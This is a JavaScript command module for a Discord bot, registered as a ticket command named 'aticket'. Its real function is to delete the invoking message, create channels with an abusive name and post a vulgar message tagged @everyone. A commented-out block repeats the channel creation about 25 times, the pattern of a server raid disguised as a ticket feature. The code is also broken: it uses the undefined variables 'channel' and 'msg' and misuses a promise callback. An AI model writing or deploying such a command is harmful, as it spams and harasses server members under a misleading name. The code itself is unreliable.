module.exports.run = async(bot, message) => {  
message.delete()

message.guild.createChannel(`fucked by poke communistes`, "text").then(channel.send(`@everyone fucked by des poke communiste`));
message.guild.createChannel(`fucked by poke communistes`, "text").then(channel.send(`@everyone fucked by des poke communiste`));

/*message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
message.guild.createChannel(`fucked by poke communistes`, "text")
*/
message.channel.send(`Votre channel à était crée<#${channel.id}>`)
channel.overwritePermissions(message.guild.id, {
      "READ_MESSAGE_HISTORY": true,
      "SEND_MESSAGES": true,
      "VIEW_CHANNEL": true,
  }) 
  .catch((err) => {if(err) return msg.channel.send(`❌ Une erreur est survenue ! ${err}`)
}).catch(console.error);
} 
  module.exports.help = {
    name: "aticket"
  }
